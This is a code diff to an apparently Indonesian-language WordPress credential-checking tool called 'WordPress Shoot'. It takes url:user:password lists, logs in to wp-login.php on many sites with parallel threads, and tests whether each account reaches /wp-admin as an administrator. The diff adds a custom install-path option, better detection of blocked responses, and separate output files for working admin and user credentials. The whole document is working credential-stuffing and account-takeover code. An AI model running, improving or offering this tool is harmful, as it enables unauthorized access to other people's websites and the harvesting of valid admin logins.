@@ -45,15 +45,19 @@ def parse_payload_line(line):
     return url, user, password
 
 
-def attempt_login(target_url, username, password):
+def attempt_login(target_url, username, password, wp_path):
     base_url = target_url.rstrip("/")
-    login_url = f"{base_url}/wp-login.php"
+    path = (wp_path or "").strip()
+    if path and not path.startswith("/"):
+        path = "/" + path
+    full_base = f"{base_url}{path}"
+    login_url = f"{full_base}/wp-login.php"
     session = requests.Session()
     data = {
         "log": username,
         "pwd": password,
         "wp-submit": "Log In",
-        "redirect_to": f"{base_url}/wp-admin/",
+        "redirect_to": f"{full_base}/wp-admin/",
         "testcookie": "1",
     }
     try:
@@ -85,17 +89,18 @@ def attempt_login(target_url, username, password):
         return False, "not_vuln", login_final_url, is_2fa
 
     # sudah login, cek akses langsung ke /wp-admin/
-    admin_url = f"{base_url}/wp-admin/"
+    admin_url = f"{full_base}/wp-admin/"
     try:
         admin_resp = session.get(admin_url, allow_redirects=True, timeout=15)
         admin_final_url = (admin_resp.url or "").lower()
         admin_body = (admin_resp.text or "").lower()
         is_admin_url = "/wp-admin" in admin_final_url
         forbidden_phrases = [
-            "sorry, you are not allowed to access this page.",
+            "you are not allowed to access this page.",
             "you do not currently have privileges on this site",
             "you do not have sufficient permissions",
             "the current user doesn't have the",
+            "you don't have permission to access this resource",
         ]
         forbidden = any(p in admin_body for p in forbidden_phrases)
 
@@ -103,7 +108,11 @@ def attempt_login(target_url, username, password):
         admin_twofa = any(p in admin_body for p in twofa_phrases)
         is_2fa = is_2fa or admin_twofa
 
-        is_admin = is_admin_url and not forbidden
+        # jika /wp-admin mengembalikan status kode blokir, anggap bukan admin
+        if admin_resp.status_code in (401, 402, 403, 500):
+            is_admin = False
+        else:
+            is_admin = is_admin_url and not forbidden
     except Exception:
         admin_final_url = None
         is_admin = True
@@ -112,11 +121,11 @@ def attempt_login(target_url, username, password):
     return True, status, login_final_url, is_2fa
 
 
-def process_target(line):
+def process_target(line, wp_path):
     url, user, password = parse_payload_line(line)
     if not url or not user or not password:
         return None
-    success, status, final_url, is_2fa = attempt_login(url, user, password)
+    success, status, final_url, is_2fa = attempt_login(url, user, password, wp_path)
     return url, user, password, success, status, final_url, is_2fa
 
 
@@ -138,6 +147,13 @@ def main():
         default=10,
         help="jumlah thread worker (default: 10)",
     )
+    parser.add_argument(
+        "-path",
+        "--path",
+        dest="wp_path",
+        default="",
+        help="path instalasi WordPress, misal /blog (opsional, default root)",
+    )
     args = parser.parse_args()
     if os.name == "nt":
         os.system("cls")
@@ -145,6 +161,7 @@ def main():
         os.system("clear")
     print(ascii_art)
     payload_file = args.input
+    wp_path = args.wp_path or ""
     if not os.path.isfile(payload_file):
         print(f"{RED}[!] File tidak ditemukan: {payload_file}{RESET}")
         return
@@ -156,7 +173,12 @@ def main():
         return
     output_dir = os.path.join(os.getcwd(), "output")
     os.makedirs(output_dir, exist_ok=True)
-    output_path = os.path.join(output_dir, "vuln.txt")
+    ts_filename = datetime.now().strftime("%Y%m%d-%H%M%S")
+    run_dir_name = f"sxwp-vuln-{ts_filename}"
+    run_dir = os.path.join(output_dir, run_dir_name)
+    os.makedirs(run_dir, exist_ok=True)
+    admin_output_path = os.path.join(run_dir, "admin.txt")
+    user_output_path = os.path.join(run_dir, "user.txt")
     total_targets = len(lines)
     print(f"{BLUE}[🔫] Menjalankan WordPress Shoot dengan {total_targets} target menggunakan {max_threads} threads...{RESET}")
 
@@ -171,10 +193,10 @@ def main():
 
     def render_block(current_url):
         nonlocal block_height
-        if block_height > 0:
-            # gunakan escape sequence yang lebih umum: cursor up (A) + clear to end (J)
-            print(f"\033[{block_height}A", end="")
-            print("\033[J", end="")
+        if os.name == "nt":
+            if block_height > 0:
+                print(f"\033[{block_height}A", end="")
+                print("\033[J", end="")
         print(f"{BLUE}[ SCANNING ] {processed_count}/{total_targets} target selesai | Terakhir: {current_url}{RESET}", flush=True)
         print(f"{YELLOW}Vuln: {vuln_count} | Not Vuln: {not_vuln_count} | Blocked: {blocked_count} | Admin: {admin_count} | User: {user_count}{RESET}", flush=True)
         for ts, url_v, user_v, pass_v, role, is_2fa in vuln_entries:
@@ -185,7 +207,7 @@ def main():
         block_height = 2 + len(vuln_entries)
 
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
-        futures = [executor.submit(process_target, line) for line in lines]
+        futures = [executor.submit(process_target, line, wp_path) for line in lines]
         for future in as_completed(futures):
             result = future.result()
             processed_count += 1
@@ -206,15 +228,18 @@ def main():
                     user_count += 1
                 ts = datetime.now().strftime("%H:%M:%S")
                 vuln_entries.append((ts, url, user, password, role, is_2fa))
+                target_output = admin_output_path if role == "admin" else user_output_path
                 with output_lock:
-                    with open(output_path, "a", encoding="utf-8") as f:
+                    with open(target_output, "a", encoding="utf-8") as f:
                         f.write(f"{url}:{user}:{password}\n")
             else:
                 not_vuln_count += 1
             render_block(url)
 
     print()
-    print(f"{GREEN}[✓] Selesai. Hasil vuln tersimpan di: {output_path}{RESET}")
+    print(f"{GREEN}[✓] Selesai.{RESET}")
+    print(f"{GREEN}    - Hasil ADMIN: {admin_output_path}{RESET}")
+    print(f"{GREEN}    - Hasil USER : {user_output_path}{RESET}")
 
 
 if __name__ == "__main__":
